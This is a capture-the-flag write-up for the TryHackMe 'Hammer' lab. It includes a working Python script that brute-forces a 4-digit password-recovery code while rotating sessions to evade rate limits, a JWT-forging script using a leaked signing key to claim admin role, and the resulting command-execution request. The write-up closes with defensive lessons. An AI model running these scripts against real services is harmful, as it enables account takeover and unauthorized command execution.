---
title: 'Hammer'
target: 'TryHackMe — Hammer'
difficulty: 'hard'
date: 2025-08-27
summary: 'A web application on port 1337 with a weak OTP recovery flow and a JWT-authenticated command execution endpoint. Brute-forced the 4-digit recovery code to reset the account password, then discovered a signing key on disk, forged an admin JWT, and used the unrestricted command endpoint to read the final flag.'
role: 'appsec'
tags: ['otp-bypass', 'jwt-forgery', 'brute-force', 'session-management', 'command-injection', 'python-scripting', 'burp-suite', 'web-exploitation']
problem: 'A web application running on port 1337 has a password recovery mechanism that issues a 4-digit OTP tied to a PHP session, and a dashboard with a command execution endpoint protected by a JWT with role-based access control. The goal is to bypass both authentication layers and retrieve the flags.'
action: 'Enumerated the web app with Nmap and ffuf, discovered a valid email in an exposed error log, brute-forced the 4-digit recovery OTP using a multithreaded Python script that rotated sessions on rate-limit, reset the password, logged in, found a JWT signing key on disk via the authenticated dashboard, forged an admin-role JWT, and used Burp Suite to execute arbitrary commands through the now-unrestricted endpoint.'
outcome: 'Retrieved both flags: THM{AuthBypass3D} from the OTP bypass and password reset, and THM{RUNANYCOMMAND1337} from the JWT forgery and command execution. Documented the full attack chain from reconnaissance through privilege escalation.'
draft: false
---

## Reconnaissance

### Nmap scan

Starting with a standard service scan against the target:

```
nmap -sS -sV 10.10.143.62
```

The scan reveals an HTTP service running on **port 1337** — a non-standard port, which immediately suggests a custom web application rather than a production deployment.

### Directory enumeration

Visiting the web page and inspecting the source reveals that all resource paths use the prefix `hmr`. That naming convention is a useful pivot for directory enumeration. Running `ffuf` with the prefix baked into the URL pattern:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://10.10.143.62:1337/hmr_FUZZ" -fc 404,400,401,402
```

This surfaces two directories: `/hmr_logs` and `/hmr_images`. Inside `/hmr_logs` is an `error.log` file containing the email address `tester@hammer.thm` — a valid account that will come in useful for the recovery flow.

---

## OTP brute-force — bypassing the recovery mechanism

### Understanding the recovery flow

The application has a password recovery feature. Submitting the email `tester@hammer.thm` redirects to a page that asks for a **4-digit recovery code** with a 180-second timer.

![The recovery code entry page, requesting a 4-digit code with a 171-second countdown timer and Submit/Cancel buttons.](/writeups/thm-hammer/01-recovery-code-page.png)

Testing the flow reveals several behaviors worth noting. Valid emails get redirected to the code entry page; invalid ones don't. The recovery code is tied to the PHP session — each new recovery request generates a new session and invalidates any previous codes. After a few wrong guesses, the application triggers rate limiting. And once the 180-second timer expires, the code is invalidated entirely.

### The brute-force script

A 4-digit code means only 10,000 possible values. The rate limiting and session expiry are the real defences, but they can be sidestepped: spawn multiple sessions in parallel, each one requesting its own recovery code, and brute-force a slice of the code space per session. If a session gets rate-limited, discard it and start a new one.

I wrote a multithreaded Python script (with some help from LLMs for the threading boilerplate) that does exactly this:

```python
import requests
import threading

url = "http://10.10.143.62:1337/reset_password.php"
base_url = "http://10.10.143.62:1337/"
RATE_LIMIT_MSG = "Rate limit exceeded"
INVALID_CODE_MSG = "Invalid or expired recovery code!"
otp_range = range(2337, 2350)
NUM_SESSIONS = 10

found = threading.Event()

def get_new_session():
    session = requests.Session()
    response = session.get(base_url)
    if response.status_code == 200:
        return session
    return None

def brute_force_worker(thread_id):
    session = get_new_session()
    if not session:
        print(f"[Thread-{thread_id}] Failed to create session.")
        return

    session.post(url, data={"email": "tester@hammer.thm"})
    print(f"[Thread-{thread_id}] Starting OTP brute-force...")

    for otp in otp_range:
        if found.is_set():
            return

        payload = {"recovery_code": otp, "s": 133}
        response = session.post(url, data=payload)

        if RATE_LIMIT_MSG in response.text:
            print(f"[Thread-{thread_id}] Rate limit hit. Restarting.")
            return

        if INVALID_CODE_MSG in response.text:
            print(f"[Thread-{thread_id}] Invalid OTP: {otp}")
            continue

        print(f"[Thread-{thread_id}] OTP FOUND: {otp}")
        reset_payload = {
            "new_password": "Password@123",
            "confirm_password": "Password@123"
        }
        session.post(url, data=reset_payload)
        found.set()
        return

def main():
    threads = []
    while not found.is_set():
        for i in range(NUM_SESSIONS):
            t = threading.Thread(target=brute_force_worker, args=(i,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        if not found.is_set():
            print("[-] OTP not found in this run.")

if __name__ == "__main__":
    main()
```

The key insight is the session rotation: each thread creates its own session, requests its own recovery code, and brute-forces independently. When rate limiting hits, the thread dies and a new one spawns with a fresh session and a fresh code. The `found` event stops all threads the moment any one of them succeeds.

Once the correct OTP was found, the script immediately reset the password to `Password@123` and the first flag dropped:

```
THM{AuthBypass3D}
```

---

## Dashboard reconnaissance

### Command execution interface

Logging in with the reset credentials opens a dashboard with a command input field. Running `ls` reveals the application's file structure:

![The dashboard command execution interface showing 'Your role: user' at the top, an ls command in the input field, and the directory listing below — including 188ade1.key, config.php, execute_command.php, and several hmr_ prefixed directories.](/writeups/thm-hammer/02-dashboard-ls-command.png)

The directory listing shows the usual PHP application files, but two entries stand out: `execute_command.php` (the backend for the command input) and `188ade1.key` (a key file sitting in the web root). Any command other than `ls` returns "Command not allowed" — the application is restricting input at the role level.

### Finding the JWT

Inspecting the page source reveals how commands are submitted. A jQuery function sends an AJAX POST to `execute_command.php` with the command in JSON format, authenticated via a `Bearer` token in the `Authorization` header:

![Page source showing the jQuery AJAX call to execute_command.php, with the Authorization header set to 'Bearer ' + jwtToken and the command sent as JSON in the request body.](/writeups/thm-hammer/03-jwt-execute-command-source.png)

The JWT is hardcoded in the page's JavaScript. Decoding it reveals the structure:

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

**Payload:**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1744317898,
  "exp": 1744321498,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The `kid` field points to `/var/www/mykey.key` — the key used to sign the token. The `role` is `user`, which explains the command restrictions. To bypass the filter, I need to forge a token with `role: "admin"`, but that requires the signing key.

### Retrieving the signing key

That `188ade1.key` file from the directory listing is suspicious. Requesting it directly through Burp Suite with the existing Bearer token returns its contents:

```
56058354efb3daa97ebab00fabd7a7d7
```

That is the HMAC secret. With this key and knowledge of the JWT structure, forging an admin token is straightforward.

---

## JWT forgery — escalating to admin

### Forging the token

I wrote a short Python script to build a new JWT with the `role` changed to `admin` and the `kid` updated to point to the key file's actual path on disk:

```python
import jwt
import datetime

SECRET_KEY = "56058354efb3daa97ebab00fabd7a7d7"

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1744318010,
    "exp": 1744321610,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)
print("JWT Token:", token)
```

Two changes from the original token: `kid` now points to `/var/www/html/188ade1.key` (the actual location of the key we retrieved), and `role` is set to `admin`. The signature is computed using the secret we extracted, so the server will accept it as valid.

### Getting the final flag

With the forged admin JWT in hand, I sent a POST request through Burp Suite to `/execute_command.php`:

```
Authorization: Bearer <forged_token>
Content-Type: application/json

{"command": "cat /home/ubuntu/flag.txt"}
```

The command restriction no longer applies — the server sees an admin role and executes whatever is sent. The response contains the final flag:

```
THM{RUNANYCOMMAND1337}
```

---

## What I took from this

This room is a clean demonstration of how authentication mechanisms fail in layers. The OTP recovery was technically rate-limited, but the rate limit was per-session rather than per-account — so spawning fresh sessions sidestepped it entirely. The JWT was signed with HS256, which is fine in isolation, but the signing key was sitting in the web root as a downloadable file. And the command restriction relied solely on the `role` claim inside a token the client could forge once the key was known. Each defence in isolation was reasonable; the chain broke because the application trusted client-controlled values (the session, the JWT) without server-side enforcement that couldn't be bypassed. The biggest practical takeaway is that rate limiting needs to be tied to the account or IP, not just the session, and signing keys should never be accessible through the web application they protect.
